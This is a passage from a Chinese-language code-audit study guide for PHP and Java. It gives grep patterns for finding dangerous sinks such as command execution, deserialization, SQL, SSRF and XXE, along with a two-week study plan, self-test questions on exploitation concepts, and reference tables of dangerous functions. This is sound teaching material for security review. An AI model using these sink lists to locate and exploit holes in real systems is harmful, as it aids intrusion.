grep -rn "file_get_contents\|file_put_contents\|fopen\|unlink\|copy\|rename\|move_uploaded_file" .

# 反序列化
grep -rn "unserialize\|__wakeup\|__destruct\|__toString" .

# SQL
grep -rn "mysql_query\|mysqli_query\|->query\|->exec" .

# 变量覆盖
grep -rn "extract\|parse_str" .
```

### Java

```powershell
# 入口
grep -rn "@Controller\|@RestController\|@RequestMapping\|@GetMapping\|@PostMapping" .

# 命令执行
grep -rn "Runtime.getRuntime\|ProcessBuilder" .

# 反序列化
grep -rn "ObjectInputStream\|readObject\|XMLDecoder\|JSON.parse" .

# 表达式注入
grep -rn "SpelExpressionParser\|parseExpression\|Ognl\|ELProcessor" .

# SQL
grep -rn "createStatement\|executeQuery\|Statement" .

# SSRF
grep -rn "openConnection\|HttpClient\|RestTemplate" .

# XXE
grep -rn "DocumentBuilderFactory\|SAXParserFactory" .
```

---

## 第 10 章 两周学习计划 + 自测

### 计划

| 天 | 内容 | 时间 |
|---|---|---|
| 1 | 第 1 章(PHP 语法) | 2h |
| 2 | 第 2.1–2.2 章(命令执行 + 代码执行) | 2h |
| 3 | 第 2.3–2.5 章(包含 + 文件 + SQL) | 2h |
| 4 | 第 2.6 章(反序列化)—— 最难,多花时间 | 2h |
| 5 | 第 3 章(PHP 特性) | 2h |
| 6 | 第 4 章(实战 + 3 道练习) | 2h |
| 7 | 读自己靶场 `E:\dsh\php-lab\*.php` 的源码 | 1.5h |
| 8 | 第 5 章(Java 语法) | 2h |
| 9 | 第 6.1–6.4 章(命令、表达式、反序列化、SQL) | 2h |
| 10 | 第 6.5–6.7 章(SSRF、XXE、模板) | 2h |
| 11 | 第 7 章(Java 实战) | 2h |
| 12 | 第 8–9 章(方法论 + grep) | 1.5h |
| 13 | 找 1 道 PHP CTF 题,自己读源码 | 2h |
| 14 | 找 1 道 Java CTF 题,看 WP 跟着读 | 2h |

### 自测:能不能答上来

```
□ $_GET 和 $_POST 有什么区别?
□ 单引号和双引号字符串,哪个会解析变量?
□ system 和 exec 的区别是什么?
□ 反引号等价于哪个函数?
□ eval 和 assert 的区别?
□ preg_replace 的 /e 修饰符是什么?
□ call_user_func 为什么危险?
□ include 为什么能读源码?用什么伪协议?
□ 文件包含的四种利用方式?
□ unserialize 会触发哪些魔术方法?
□ __destruct 什么时候执行?
□ PHP 里 == 和 === 的区别?举一个 == 的绕过例子?
□ Java 里怎么执行系统命令?
□ Java 的 Statement 和 PreparedStatement 哪个安全?为什么?
□ MyBatis 的 ${} 和 #{} 有什么区别?
□ Spring 的哪个注解表示参数可控?
□ Runtime.exec 和 ProcessBuilder 的区别?
```

**能答上 12 个以上,基本的代码审计就过关了。**

---

## 附录:两个必须记住的对照表

### PHP 危险函数一句话

| 函数 | 一句话 |
|---|---|
| `system` | 执行命令并打印 |
| `exec` | 执行命令,返回最后一行 |
| `shell_exec` / 反引号 | 执行命令,返回全部输出 |
| `passthru` | 执行命令,输出原始数据 |
| `eval` | 把字符串当代码执行 |
| `assert` | PHP 7 下同 eval |
| `create_function` | 动态创建函数,第二参数是代码 |
| `preg_replace(/e)` | 替换内容当代码执行 |
| `call_user_func` | 调用任意函数 |
| `include` | 执行目标文件 |
| `file_get_contents` | 读文件(或访问 URL) |
| `unserialize` | 还原对象,触发魔术方法 |

### Java 危险点一句话

| 类 / 方法 | 一句话 |
|---|---|
| `Runtime.exec` / `ProcessBuilder` | 执行系统命令 |
| `SpelExpressionParser` | 执行 Spring 表达式 |
| `Ognl.getValue` | 执行 OGNL 表达式 |
| `ObjectInputStream.readObject` | 反序列化(利用链 RCE) |
| `JSON.parse`(Fastjson) | autoType 反序列化 |
| `Statement` + 拼接 | SQL 注入 |
| `URL.openConnection` | SSRF |
| `DocumentBuilderFactory` | XXE |
| `TemplateEngine.process` | 模板注入 |

---

**这份文件到这里结束。遇到看不懂的代码,回来查对应的章节。**
